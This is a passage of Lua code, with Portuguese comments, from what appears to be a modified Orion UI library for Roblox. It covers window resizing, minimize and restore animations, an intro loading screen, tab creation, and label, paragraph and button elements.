				if Dot2 then TweenService:Create(Dot2, TweenInfo.new(0.1), {BackgroundTransparency = 0}):Play() end
				if Dot3 then TweenService:Create(Dot3, TweenInfo.new(0.1), {BackgroundTransparency = 0}):Play() end
			end
		end)
		
		AddConnection(UserInputService.InputChanged, function(Input)
			if Resizing and (Input.UserInputType == Enum.UserInputType.MouseMovement or Input.UserInputType == Enum.UserInputType.Touch) then
				local Delta = Vector2.new(Input.Position.X - StartPos.X, Input.Position.Y - StartPos.Y)
				local NewWidth = math.max(500, math.min(1200, StartSize.X + Delta.X))
				local NewHeight = math.max(300, math.min(800, StartSize.Y + Delta.Y))
				
				-- Resize suave (SEM BARREIRA)
				MainWindow.Size = UDim2.new(0, NewWidth, 0, NewHeight)
				
				-- Atualizar OriginalSize para salvar o novo tamanho
				OriginalSize = MainWindow.Size
				
				-- Regredir painel lateral SUAVEMENTE apenas se necessário
				local currentSideWidth = WindowStuff.AbsoluteSize.X
				local maxAllowedWidth = NewWidth * 0.45 -- Máximo 45% da largura da janela
				
				-- Só regride se o painel estiver MUITO grande (> 50% da janela) E a janela for pequena
				if NewWidth < 650 and currentSideWidth > maxAllowedWidth and currentSideWidth > 200 then
					local targetWidth = math.max(180, maxAllowedWidth)
					
					-- Animação SUAVE de regressão
					TweenService:Create(WindowStuff, TweenInfo.new(0.3, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), {
						Size = UDim2.new(0, targetWidth, 1, -50)
					}):Play()
					
					-- Atualizar containers com animação
					for _, ItemContainer in pairs(MainWindow:GetChildren()) do
						if string.match(ItemContainer.Name, "^ItemContainer_") then
							TweenService:Create(ItemContainer, TweenInfo.new(0.3, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), {
								Size = UDim2.new(1, -targetWidth, 1, -50),
								Position = UDim2.new(0, targetWidth, 0, 50)
							}):Play()
						end
					end
				end
			end
		end)
		
		AddConnection(UserInputService.InputEnded, function(Input)
			if Input.UserInputType == Enum.UserInputType.MouseButton1 or Input.UserInputType == Enum.UserInputType.Touch then
				if Resizing then
					Resizing = false
					-- Return dots to semi-visible after resizing
					if Dot1 then TweenService:Create(Dot1, TweenInfo.new(0.2), {BackgroundTransparency = 0.7}):Play() end
					if Dot2 then TweenService:Create(Dot2, TweenInfo.new(0.2), {BackgroundTransparency = 0.7}):Play() end
					if Dot3 then TweenService:Create(Dot3, TweenInfo.new(0.2), {BackgroundTransparency = 0.7}):Play() end
				end
			end
		end)
		
	end
	
	-- 📐 SISTEMA DE RESIZE LATERAL (3 dots indicator)
	local SideResizing = false
	local SideResizeBtn = WindowStuff:FindFirstChild("SideResizeBtn")
	if SideResizeBtn then
		local Dot1 = SideResizeBtn:FindFirstChild("Dot1")
		local Dot2 = SideResizeBtn:FindFirstChild("Dot2")
		local Dot3 = SideResizeBtn:FindFirstChild("Dot3")
		
		-- Hover effect - MOSTRAR BOLINHAS MAIS VISÍVEIS
		AddConnection(SideResizeBtn.MouseEnter, function()
			if not SideResizing then 
				if Dot1 then TweenService:Create(Dot1, TweenInfo.new(0.15), {BackgroundTransparency = 0.3}):Play() end
				if Dot2 then TweenService:Create(Dot2, TweenInfo.new(0.15), {BackgroundTransparency = 0.3}):Play() end
				if Dot3 then TweenService:Create(Dot3, TweenInfo.new(0.15), {BackgroundTransparency = 0.3}):Play() end
			end
		end)
		
		AddConnection(SideResizeBtn.MouseLeave, function()
			if not SideResizing then 
				if Dot1 then TweenService:Create(Dot1, TweenInfo.new(0.15), {BackgroundTransparency = 0.7}):Play() end
				if Dot2 then TweenService:Create(Dot2, TweenInfo.new(0.15), {BackgroundTransparency = 0.7}):Play() end
				if Dot3 then TweenService:Create(Dot3, TweenInfo.new(0.15), {BackgroundTransparency = 0.7}):Play() end
			end
		end)
		
		local StartSize, StartPos
		
		AddConnection(SideResizeBtn.InputBegan, function(Input)
			if Input.UserInputType == Enum.UserInputType.MouseButton1 or Input.UserInputType == Enum.UserInputType.Touch then
				SideResizing = true
				StartSize = WindowStuff.AbsoluteSize
				StartPos = Vector2.new(Input.Position.X, Input.Position.Y)
				
				-- Mostrar bolinhas totalmente visíveis ao começar resize
				if Dot1 then TweenService:Create(Dot1, TweenInfo.new(0.1), {BackgroundTransparency = 0}):Play() end
				if Dot2 then TweenService:Create(Dot2, TweenInfo.new(0.1), {BackgroundTransparency = 0}):Play() end
				if Dot3 then TweenService:Create(Dot3, TweenInfo.new(0.1), {BackgroundTransparency = 0}):Play() end
			end
		end)
		
		AddConnection(UserInputService.InputChanged, function(Input)
			if SideResizing and (Input.UserInputType == Enum.UserInputType.MouseMovement or Input.UserInputType == Enum.UserInputType.Touch) then
				local Delta = Vector2.new(Input.Position.X - StartPos.X, 0)
				-- Limite máximo é 50% da largura da janela
				local MaxWidth = MainWindow.AbsoluteSize.X * 0.5
				local NewWidth = math.max(40, math.min(MaxWidth, StartSize.X + Delta.X))
				
				-- Resize WindowStuff (painel lateral)
				WindowStuff.Size = UDim2.new(0, NewWidth, 1, -50)
				
				-- Atualizar todos os Containers para respeitar o novo tamanho
				for _, ItemContainer in pairs(MainWindow:GetChildren()) do
					if string.match(ItemContainer.Name, "^ItemContainer_") then
						ItemContainer.Size = UDim2.new(1, -NewWidth, 1, -50)
						ItemContainer.Position = UDim2.new(0, NewWidth, 0, 50)
					end
				end
				
				-- Sistema de responsividade COMPLETO
				local PlayerAvatar = WindowStuff:FindFirstChild("PlayerAvatar", true)
				local PlayerName = WindowStuff:FindFirstChild("PlayerName", true)
				
				-- SEARCHBAR: Mostrar só emoji quando pequeno
				if SearchBox then
					if NewWidth < 80 then
						SearchBox.PlaceholderText = "🔍"
						SearchBox.Text = SearchBox.Text == "" and "" or SearchBox.Text
					else
						SearchBox.PlaceholderText = "🔍 Search"
					end
				end
				
				-- ESCONDER TABS (letras das abas) só quando REALMENTE necessário
				for _, Tab in pairs(TabHolder:GetChildren()) do
					if Tab:IsA("TextButton") then
						local TabTitle = Tab:FindFirstChild("Title")
						if TabTitle then
							-- Esconder só quando muito pequeno (< 60px = só ícones)
							if NewWidth < 60 then
								TabTitle.Visible = false
							else
								TabTitle.Visible = true
							end
						end
					end
				end
				
				-- Sistema de responsividade SIMPLES - SEM DIMINUIR AVATAR
				if NewWidth < 40 then
					-- MUITO PEQUENO: esconder TUDO
					if PlayerAvatar then PlayerAvatar.Visible = false end
					if PlayerName then PlayerName.Visible = false end
				elseif NewWidth < 70 then
					-- PEQUENO: mostrar só avatar (TAMANHO FIXO) SEM nome
					if PlayerAvatar then 
						PlayerAvatar.Visible = true
						-- NÃO MEXER NO TAMANHO!
					end
					if PlayerName then PlayerName.Visible = false end
				else
					-- NORMAL: mostrar tudo
					if PlayerAvatar then 
						PlayerAvatar.Visible = true
						-- NÃO MEXER NO TAMANHO!
					end
					if PlayerName then 
						PlayerName.Visible = true
						-- NÃO MEXER NA POSIÇÃO!
					end
				end
			end
		end)
		
		AddConnection(UserInputService.InputEnded, function(Input)
			if Input.UserInputType == Enum.UserInputType.MouseButton1 or Input.UserInputType == Enum.UserInputType.Touch then
				if SideResizing then
					SideResizing = false
					-- Resetar bolinhas para semi-transparente
					if Dot1 then TweenService:Create(Dot1, TweenInfo.new(0.2), {BackgroundTransparency = 0.7}):Play() end
					if Dot2 then TweenService:Create(Dot2, TweenInfo.new(0.2), {BackgroundTransparency = 0.7}):Play() end
					if Dot3 then TweenService:Create(Dot3, TweenInfo.new(0.2), {BackgroundTransparency = 0.7}):Play() end
				end
			end
		end)
		
	end

	AddConnection(MobileOpenButton.MouseButton1Click, function() 
		MobileOpenButton.Visible = false
		MainWindow.Visible = true
		UIHidden = false
		freeMouse.Modal = true
		buttonmodal.Modal = true
		UserInputService.MouseIconEnabled = true
		freeMouse.Visible = true
	end)

	local function showMobileOpenButton()
		if UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled then
			if UIHidden then
				MobileOpenButton.Visible = true
			else
				MobileOpenButton.Visible = false
			end
		end
	end

	AddConnection(CloseBtn.MouseButton1Up, function()
		-- Hide UI (NO FADE - prevents bugs)
		MainWindow.Visible = false
		UIHidden = true
		
		-- FORÇAR DESATIVAÇÃO DO MOUSE UI E MODAL
		mouselock = false
		freeMouse.Visible = false
		freeMouse.Modal = false
		buttonmodal.Modal = false
		UserInputService.MouseBehavior = Enum.MouseBehavior.LockCenter
		UserInputService.MouseIconEnabled = false
		
		-- SEMPRE resetar mouse ao fechar
		if mouselock then
			mouselock = false
		end
		
		if WindowConfig.FreeMouse then
			UnlockMouse(false)
		end
		
		OrionLib:MakeNotification({
			Name = "Interface Hidden",
			Content = "Press " .. WindowConfig.KeyToOpenWindow .. " to reopen the interface",
			Time = 5
		})
		
		showMobileOpenButton()
		WindowConfig.CloseCallback()
	end)

	AddConnection(UserInputService.InputBegan, function(Input, gameProcessed)
		if gameProcessed then return end
		if Input.KeyCode == Enum.KeyCode[WindowConfig.KeyToOpenWindow] then
			if UIHidden then
				-- Show UI
				MainWindow.Visible = true
				UIHidden = false
				freeMouse.Visible = true
				freeMouse.Modal = true
				buttonmodal.Modal = true
				UserInputService.MouseBehavior = Enum.MouseBehavior.Default
				UserInputService.MouseIconEnabled = true
				
				if WindowConfig.FreeMouse then
					UnlockMouse(true)
				end

				showMobileOpenButton()
			else
				-- Hide UI
				MainWindow.Visible = false
				UIHidden = true
				
				-- FORÇAR DESATIVAÇÃO DO MOUSE UI E MODAL
				mouselock = false
				freeMouse.Visible = false
				freeMouse.Modal = false
				buttonmodal.Modal = false
				UserInputService.MouseBehavior = Enum.MouseBehavior.LockCenter
				UserInputService.MouseIconEnabled = false

				if WindowConfig.FreeMouse then
					UnlockMouse(false)
				end

				showMobileOpenButton()
				WindowConfig.CloseCallback()
			end
		end
	end)

	-- MINIMIZE SYSTEM (COMPLETELY REBUILT FROM SCRATCH)
	local OriginalSize = UDim2.new(0, 615, 0, 344)
	
	-- Calcular largura baseada no nome + stats + botões
	local nameWidth = #WindowConfig.Name * 14 -- Aproximadamente 14px por letra (fonte maior)
	local statsWidth = 190 -- Espaço para stats (data hora | ms/fps | temp)
	local buttonsWidth = 80 -- Espaço para botões +/-/X (reduzido)
	local padding = 30 -- Padding
	local minimizedWidth = math.max(300, nameWidth + statsWidth + buttonsWidth + padding)
	
	local MinimizedSize = UDim2.new(0, minimizedWidth, 0, 50)
	local savedVisibility = {}
	local savedSideWidth = nil -- Salvar largura do painel lateral
	local savedWindowSize = nil -- Salvar tamanho da janela
	local letterAnimationLoop = nil
	
	-- Função de animação contínua das letras (SEMPRE ATIVA)
	local letterAnimationActive = true
	
	local function startLetterAnimation()
		if letterAnimationLoop then return end
		
		letterAnimationLoop = task.spawn(function()
			task.wait(2)
			
			while letterAnimationActive do
				for i = #windowLetters, 1, -1 do
					if not letterAnimationActive then break end
					local letter = windowLetters[i]
					TweenService:Create(letter, TweenInfo.new(0.4, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {
						TextTransparency = 1
					}):Play()
					task.wait(0.08)
				end
				
				task.wait(0.6)
				
				for i = 1, #windowLetters do
					if not letterAnimationActive then break end
					local letter = windowLetters[i]
					TweenService:Create(letter, TweenInfo.new(0.4, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {
						TextTransparency = 0
					}):Play()
					task.wait(0.08)
				end
				
				task.wait(5)
			end
			letterAnimationLoop = nil
		end)
	end
	
	-- Iniciar animação automaticamente
	startLetterAnimation()
	
	local isAnimating = false -- Prevenir cliques múltiplos durante animação
	
	AddConnection(MinimizeBtn.MouseButton1Up, function()
		if Resizing or isAnimating then return end -- Prevenir bugs
		isAnimating = true
		
		if Minimized then
			-- RESTORE - Animação suave SEM GLITCHES
			Minimized = false
			MinimizeBtn.Ico.Image = "rbxassetid://7072719338"
			freeMouse.Visible = true
			freeMouse.Modal = true
			UserInputService.MouseBehavior = Enum.MouseBehavior.Default
			UserInputService.MouseIconEnabled = true
			
			-- Mostrar elementos ANTES da animação (mas transparentes)
			WindowStuff.Visible = true
			WindowTopBarLine.Visible = true
			if ResizeBtn then ResizeBtn.Visible = true end
			if SideResizeBtn then SideResizeBtn.Visible = true end
			if ClockLabel then ClockLabel.Visible = true end
			
			-- Restaurar todos os elementos salvos ANTES da animação
			for element, wasVisible in pairs(savedVisibility) do
				if element and element.Parent then
					element.Visible = wasVisible
				end
			end
			
			-- Restaurar largura do painel lateral
			if savedSideWidth then
				WindowStuff.Size = UDim2.new(0, savedSideWidth, 1, -50)
				
				-- Atualizar containers
				for _, ItemContainer in pairs(MainWindow:GetChildren()) do
					if string.match(ItemContainer.Name, "^ItemContainer_") then
						ItemContainer.Size = UDim2.new(1, -savedSideWidth, 1, -50)
						ItemContainer.Position = UDim2.new(0, savedSideWidth, 0, 50)
					end
				end
			end
			
			-- Restaurar tamanho da janela
			if savedWindowSize then
				OriginalSize = savedWindowSize
			end
			
			-- Restaurar posição do StatsLabel instantaneamente
			if StatsLabel then 
				StatsLabel.TextXAlignment = Enum.TextXAlignment.Right
				StatsLabel.Position = UDim2.new(1, -290, 0, 15)
				StatsLabel.Size = UDim2.new(0, 190, 0, 30)
			end
			
			-- Agora animar o tamanho da janela suavemente
			MainWindow.ClipsDescendants = true
			local restoreTween = TweenService:Create(MainWindow, TweenInfo.new(0.35, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), {Size = OriginalSize})
			restoreTween:Play()
			
			-- Desativar ClipsDescendants e liberar flag após a animação
			restoreTween.Completed:Connect(function()
				MainWindow.ClipsDescendants = false
				isAnimating = false
			end)
			
			-- Clear saved states
			savedVisibility = {}
		else
			-- MINIMIZE - Animação suave SEM GLITCHES
			Minimized = true
			MinimizeBtn.Ico.Image = "rbxassetid://7072720870"
			
			-- Salvar largura atual do painel lateral E tamanho da janela
			savedSideWidth = WindowStuff.AbsoluteSize.X
			savedWindowSize = MainWindow.Size
			
			-- Save visibility of all descendants
			for _, child in pairs(WindowStuff:GetDescendants()) do
				if child:IsA("GuiObject") then
					savedVisibility[child] = child.Visible
				end
			end
			
			-- Animar StatsLabel ANTES de esconder elementos
			if StatsLabel then 
				local statsX = nameWidth + 20 -- Logo após o nome
				StatsLabel.TextXAlignment = Enum.TextXAlignment.Left
				TweenService:Create(StatsLabel, TweenInfo.new(0.25, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
					Position = UDim2.new(0, statsX, 0, 15),
					Size = UDim2.new(0, statsWidth, 0, 30)
				}):Play()
			end
			
			-- Iniciar animação de minimização
			MainWindow.ClipsDescendants = true
			local minimizeTween = TweenService:Create(MainWindow, TweenInfo.new(0.35, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), {Size = MinimizedSize})
			minimizeTween:Play()
			
			-- Esconder elementos DURANTE a animação usando delay sem bloquear thread
			task.delay(0.1, function()
				WindowStuff.Visible = false
				WindowTopBarLine.Visible = false
				if ResizeBtn then ResizeBtn.Visible = false end
				if SideResizeBtn then SideResizeBtn.Visible = false end
				if ClockLabel then ClockLabel.Visible = false end
			end)
			
			-- Liberar flag após animação completar
			minimizeTween.Completed:Connect(function()
				isAnimating = false
			end)
		end
	end)

	local function LoadSequence()
		MainWindow.Visible = false
		
		-- Fundo escuro FULLSCREEN (cobre TODA a tela)
		local LoadBg = SetProps(MakeElement("Frame"), {
			Parent = Orion,
			Position = UDim2.new(0, 0, 0, 0),
			AnchorPoint = Vector2.new(0, 0),
			Size = UDim2.new(1, 0, 1, 0),
			BackgroundColor3 = Color3.fromRGB(15, 15, 15),
			BackgroundTransparency = 0,
			BorderSizePixel = 0,
			ZIndex = 10000 -- ZIndex muito alto para ficar por cima de tudo
		})
		
		local LoadSequenceLogo = SetChildren(SetProps(MakeElement("Image", "rbxassetid://90795277706700"), {
			Parent = LoadBg,
			AnchorPoint = Vector2.new(0.5, 0.5),
			Position = UDim2.new(0.5, 0, 0.45, 0),
			Size = UDim2.new(0, 0, 0, 0),
			ImageColor3 = Color3.fromRGB(255, 255, 255),
			ImageTransparency = 1,
			ZIndex = 10001
		}), {
			Create("UICorner", {CornerRadius = UDim.new(0.5, 0)}) -- Borda redonda
		})

		-- Container para as letras individuais
		local TextContainer = SetProps(MakeElement("Frame"), {
			Parent = LoadBg,
			Size = UDim2.new(1, 0, 0, 30),
			AnchorPoint = Vector2.new(0.5, 0.5),
			Position = UDim2.new(0.5, 0, 0.58, 0),
			BackgroundTransparency = 1,
			ZIndex = 10001
		})
		
		-- Criar letras individuais
		local text = WindowConfig.IntroText
		local letters = {}
		local totalWidth = 0
		
		-- Calcular largura total aproximada
		for i = 1, #text do
			local char = text:sub(i, i)
			local charWidth = char == " " and 8 or 12
			totalWidth = totalWidth + charWidth
		end
		
		-- Criar cada letra
		local currentX = -totalWidth / 2
		for i = 1, #text do
			local char = text:sub(i, i)
			local charWidth = char == " " and 8 or 12
			
			local letterLabel = SetProps(MakeElement("Label", char, 16), {
				Parent = TextContainer,
				Size = UDim2.new(0, charWidth, 1, 0),
				Position = UDim2.new(0.5, currentX, 0, 0),
				Font = Enum.Font.GothamBold,
				TextTransparency = 1,
				TextColor3 = Color3.fromRGB(255, 255, 255),
				BackgroundTransparency = 1,
				ZIndex = 10002
			})
			
			table.insert(letters, letterLabel)
			currentX = currentX + charWidth
		end
		
		local LoadingBar = SetChildren(SetProps(MakeElement("Frame"), {
			Parent = LoadBg,
			AnchorPoint = Vector2.new(0.5, 0.5),
			Position = UDim2.new(0.5, 0, 0.65, 0),
			Size = UDim2.new(0, 200, 0, 3),
			BackgroundColor3 = Color3.fromRGB(60, 60, 60),
			BackgroundTransparency = 0.5,
			ZIndex = 10001
		}), {
			SetProps(MakeElement("Frame"), {
				Size = UDim2.new(0, 0, 1, 0),
				BackgroundColor3 = OrionLib.Themes[OrionLib.SelectedTheme].Stroke,
				Name = "Fill",
				ZIndex = 10002
			}),
			Create("UICorner", {CornerRadius = UDim.new(1, 0)})
		})

		-- Animação com logo aparecendo (bordas redondas)
		TweenService:Create(LoadSequenceLogo, TweenInfo.new(0.3, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {Size = UDim2.new(0, 64, 0, 64), ImageTransparency = 0}):Play()
		wait(0.15)
		
		-- Letras aparecem
		for i, letter in ipairs(letters) do
			task.spawn(function()
				wait(i * 0.015)
				TweenService:Create(letter, TweenInfo.new(0.15, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextTransparency = 0}):Play()
			end)
		end
		
		wait(0.1 + #letters * 0.015)
		TweenService:Create(LoadingBar.Fill, TweenInfo.new(0.6, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {Size = UDim2.new(1, 0, 1, 0)}):Play()
		wait(0.7)
		
		-- Letras desaparecem mais suave
		for i = #letters, 1, -1 do
			local letter = letters[i]
			task.spawn(function()
				wait((#letters - i) * 0.012)
				TweenService:Create(letter, TweenInfo.new(0.15, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
					TextTransparency = 1,
					Position = letter.Position + UDim2.new(0, 0, 0, -10)
				}):Play()
			end)
		end
		
		-- Fade out suave
		TweenService:Create(LoadBg, TweenInfo.new(0.4, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {BackgroundTransparency = 1}):Play()
		TweenService:Create(LoadSequenceLogo, TweenInfo.new(0.4, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {ImageTransparency = 1}):Play()
		TweenService:Create(LoadingBar, TweenInfo.new(0.4, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {BackgroundTransparency = 1}):Play()
		TweenService:Create(LoadingBar.Fill, TweenInfo.new(0.4, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {BackgroundTransparency = 1}):Play()
		
		MainWindow.Visible = true
		freeMouse.Modal = true
		buttonmodal.Modal = true
		UserInputService.MouseIconEnabled = true
		freeMouse.Visible = true
		
		wait(0.2)
		LoadBg:Destroy()
	end 

	if WindowConfig.IntroEnabled then
		LoadSequence()
	end
	
	-- Ativar freeMouse quando UI abre
	freeMouse.Visible = true	

	if WindowConfig.FreeMouse then
		-- Free mouse enabled silently
	end
	
	-- Carregar configurações salvas (tema, etc) ANTES de criar tabs
	OrionLib:Init()

	local TabFunction = {}
	function TabFunction:MakeTab(TabConfig)
		TabConfig = TabConfig or {}
		TabConfig.Name = TabConfig.Name or "Tab"
		TabConfig.Icon = TabConfig.Icon or ""
		TabConfig.PremiumOnly = TabConfig.PremiumOnly or false

		local TabFrame = SetChildren(SetProps(MakeElement("Button"), {
			Size = UDim2.new(1, 0, 0, 30),
			Parent = TabHolder
		}), {
			AddThemeObject(SetProps(MakeElement("Image", TabConfig.Icon), {
				AnchorPoint = Vector2.new(0, 0.5),
				Size = UDim2.new(0, 18, 0, 18),
				Position = UDim2.new(0, 10, 0.5, 0),
				ImageTransparency = 1,
				Name = "Ico"
			}), "Text"),
			AddThemeObject(SetProps(MakeElement("Label", TabConfig.Name, 14), {
				Size = UDim2.new(1, -35, 1, 0),
				Position = UDim2.new(0, 35, 0, 0),
				Font = Enum.Font.GothamSemibold,
				TextTransparency = 1,
				Name = "Title"
			}), "Text")
		})

		if GetIcon(TabConfig.Icon) ~= nil then
			TabFrame.Ico.Image = GetIcon(TabConfig.Icon)
		end
		
		-- Adicionar tab à tabela Tabs para o SearchBar
		Tabs[TabConfig.Name] = TabFrame
		
		-- Sem animação = mais rápido
		TabFrame.Ico.ImageTransparency = 0.4
		TabFrame.Title.TextTransparency = 0.4	

		local Container = AddThemeObject(SetChildren(SetProps(MakeElement("ScrollFrame", Color3.fromRGB(255, 255, 255), 4), {
			Size = UDim2.new(1, -150, 1, -50),
			Position = UDim2.new(0, 150, 0, 50),
			Parent = MainWindow,
			Visible = false,
			Name = "ItemContainer_" .. TabConfig.Name,  -- Nome único para cada container
			ClipsDescendants = true,
			BorderSizePixel = 0
		}), {
			MakeElement("List", 0, 6),
			MakeElement("Padding", 15, 10, 10, 15) -- Padding ORIGINAL (top, right, bottom, left)
		}), "Divider")
		
		-- Mapear Container para esta tab
		TabContainers[TabConfig.Name] = Container
		
		-- CanvasSize automático - não precisa mais ajustar manualmente

		if FirstTab then
			FirstTab = false
			TabFrame.Ico.ImageTransparency = 0
			TabFrame.Title.TextTransparency = 0
			TabFrame.Title.Font = Enum.Font.GothamBlack
			Container.Visible = true
		end    

		AddConnection(TabFrame.MouseButton1Click, function()
			-- Se houver busca ativa, limpar automaticamente
			if SearchBox.Text ~= "" then
				SearchBox.Text = ""
			end
			
			-- Resetar estilo de TODAS as tabs
			for _, Tab in next, TabHolder:GetChildren() do
				if Tab:IsA("TextButton") then
					Tab.Title.Font = Enum.Font.GothamSemibold
					TweenService:Create(Tab.Ico, TweenInfo.new(0.25, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), {ImageTransparency = 0.4}):Play()
					TweenService:Create(Tab.Title, TweenInfo.new(0.25, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), {TextTransparency = 0.4}):Play()
				end    
			end
			
			-- CRÍTICO: Esconder TODOS os containers do TabContainers (incluindo Config)
			for _, tabContainer in pairs(TabContainers) do
				tabContainer.Visible = false
			end
			
			-- Esconder containers antigos (fallback)
			for _, ItemContainer in next, MainWindow:GetChildren() do
				if string.match(ItemContainer.Name, "^ItemContainer_") then
					ItemContainer.Visible = false
				end
			end  
			
			-- Aplicar estilo na tab clicada
			TweenService:Create(TabFrame.Ico, TweenInfo.new(0.25, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), {ImageTransparency = 0}):Play()
			TweenService:Create(TabFrame.Title, TweenInfo.new(0.25, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), {TextTransparency = 0}):Play()
			TabFrame.Title.Font = Enum.Font.GothamBlack
			
			-- Mostrar APENAS o container desta tab
			Container.Visible = true
			lastActiveContainer = Container -- Atualizar container ativo para search
		end)

		local ElementFunction = {}

		local function GetElements(ItemParent)
			local ElementFunction = {}
			function ElementFunction:AddLabel(Text)
				local LabelContent = AddThemeObject(SetProps(MakeElement("Label", "", 15), {
					Size = UDim2.new(1, -12, 1, 0),
					Position = UDim2.new(0, 12, 0, 0),
					Font = Enum.Font.GothamBold,
					Name = "Content"
				}), "Text")
				
				local LabelFrame = AddThemeObject(SetChildren(SetProps(MakeElement("RoundFrame", Color3.fromRGB(255, 255, 255), 0, 5), {
					Size = UDim2.new(1, 0, 0, 30),
					BackgroundTransparency = 0.7,
					Parent = ItemParent
				}), {
					LabelContent,
					AddThemeObject(MakeElement("Stroke"), "Stroke")
				}), "Second")

				LabelContent.Text = Text
				
				-- Registrar label para pesquisa
				table.insert(SearchableElements, {
					Name = Text,
					TabName = TabConfig.Name,
					Type = "Label",
					Frame = LabelFrame
				})

				local LabelFunction = {}
				function LabelFunction:Set(ToChange)
					LabelContent.Text = ToChange
				end
				return LabelFunction
			end

			function ElementFunction:AddPlayerParagraph(userId)
				userId = userId or 0
			
				local displayName = "Unknown"
				local username = "Unknown"
			
				local success, result = pcall(function()
					return UserService:GetUserInfosByUserIdsAsync({userId})
				end)
			
				if success and result and result[1] then
					displayName = result[1].DisplayName or "Unknown"
					username = result[1].Username or "Unknown"
				end
			
				local ParagraphFrame = AddThemeObject(SetChildren(SetProps(MakeElement("RoundFrame", Color3.fromRGB(255, 255, 255), 0, 5), {
				Size = UDim2.new(1, 0, 0, 70),
				BackgroundTransparency = 0.7,
				Parent = ItemParent
				}), {
				SetProps(MakeElement("Image", "", 0), {
				Name = "Avatar",
				Size = UDim2.new(0, 60, 0, 60),
				Position = UDim2.new(0, 5, 0, 5),
				BackgroundTransparency = 1,
				Image = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. userId .. "&width=420&height=420&format=png"
				}),
			
				AddThemeObject(SetProps(MakeElement("Label", displayName, 15), {
				Name = "DisplayName",
				Size = UDim2.new(1, -70, 0, 20),
				Position = UDim2.new(0, 70, 0, 10),
				Font = Enum.Font.GothamBold,
				TextXAlignment = Enum.TextXAlignment.Left
				}), "Text"),
			
				AddThemeObject(SetProps(MakeElement("Label", username, 13), {
				Name = "Username",
				Size = UDim2.new(1, -70, 0, 20),
				Position = UDim2.new(0, 70, 0, 35),
				Font = Enum.Font.GothamSemibold,
				TextXAlignment = Enum.TextXAlignment.Left
				}), "TextDark"),
			
				AddThemeObject(MakeElement("Stroke"), "Stroke")
				}), "Second")
				
				-- Registrar PlayerParagraph para pesquisa
				table.insert(SearchableElements, {
					Name = displayName .. " " .. username,
					TabName = TabConfig.Name,
					Type = "PlayerParagraph",
					Frame = ParagraphFrame
				})
			
				local PlayerParagraph = {}
				
				function PlayerParagraph:Set(newUserId)
					newUserId = newUserId or 0
				
					local dname = "Unknown"
					local uname = "Unknown"
				
					local ok, data = pcall(function()
						return UserService:GetUserInfosByUserIdsAsync({newUserId})
					end)
				
					if ok and data and data[1] then
						dname = data[1].DisplayName or "Unknown"
						uname = data[1].Username or "Unknown"
					end
				
					ParagraphFrame.DisplayName.Text = dname
					ParagraphFrame.DisplayName.Visible = true
					ParagraphFrame.Username.Text = uname
					ParagraphFrame.Username.Position = UDim2.new(0, 70, 0, 35)
					ParagraphFrame.Avatar.Image = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. newUserId .. "&width=420&height=420&format=png"
				end
			
				return PlayerParagraph
			end

			function ElementFunction:AddParagraph(Text, Content)
				Text = Text or "Text"
				Content = Content or "Content"

				local ParagraphFrame = AddThemeObject(SetChildren(SetProps(MakeElement("RoundFrame", Color3.fromRGB(255, 255, 255), 0, 5), {
					Size = UDim2.new(1, 0, 0, 30),
					BackgroundTransparency = 0.7,
					Parent = ItemParent
				}), {
					AddThemeObject(SetProps(MakeElement("Label", Text, 15), {
						Size = UDim2.new(1, -12, 0, 14),
						Position = UDim2.new(0, 12, 0, 10),
						Font = Enum.Font.GothamBold,
						Name = "Title"
					}), "Text"),
					AddThemeObject(SetProps(MakeElement("Label", "", 13), {
						Size = UDim2.new(1, -24, 0, 0),
						Position = UDim2.new(0, 12, 0, 26),
						Font = Enum.Font.GothamSemibold,
						Name = "Content",
						TextWrapped = true
					}), "TextDark"),
					AddThemeObject(MakeElement("Stroke"), "Stroke")
				}), "Second")

				AddConnection(ParagraphFrame.Content:GetPropertyChangedSignal("Text"), function()
					ParagraphFrame.Content.Size = UDim2.new(1, -24, 0, ParagraphFrame.Content.TextBounds.Y)
					ParagraphFrame.Size = UDim2.new(1, 0, 0, ParagraphFrame.Content.TextBounds.Y + 35)
				end)

				ParagraphFrame.Content.Text = Content
				
				-- Registrar Paragraph para pesquisa
				table.insert(SearchableElements, {
					Name = Text,
					TabName = TabConfig.Name,
					Type = "Paragraph",
					Frame = ParagraphFrame
				})

				local ParagraphFunction = {}
				function ParagraphFunction:Set(ToChange)
					ParagraphFrame.Content.Text = ToChange
				end
				return ParagraphFunction
			end

			function ElementFunction:AddButton(ButtonConfig)
				ButtonConfig = ButtonConfig or {}
				ButtonConfig.Name = ButtonConfig.Name or "Button"
				ButtonConfig.Callback = ButtonConfig.Callback or function() end
				ButtonConfig.Icon = ButtonConfig.Icon or "rbxassetid://3944703587"

				local Button = {}

				local Click = SetProps(MakeElement("Button"), {
					Size = UDim2.new(1, 0, 1, 0)
				})

				local ButtonLabel = AddThemeObject(SetProps(MakeElement("Label", "", 15), {
					Size = UDim2.new(1, -12, 1, 0),
					Position = UDim2.new(0, 12, 0, 0),
					Font = Enum.Font.GothamBold,
					Name = "Content"
				}), "Text")

				local ButtonFrame = AddThemeObject(SetChildren(SetProps(MakeElement("RoundFrame", Color3.fromRGB(255, 255, 255), 0, 5), {
					Size = UDim2.new(1, 0, 0, 33),
					Parent = ItemParent
				}), {
					ButtonLabel,
					AddThemeObject(SetProps(MakeElement("Image", ButtonConfig.Icon), {
						Size = UDim2.new(0, 20, 0, 20),
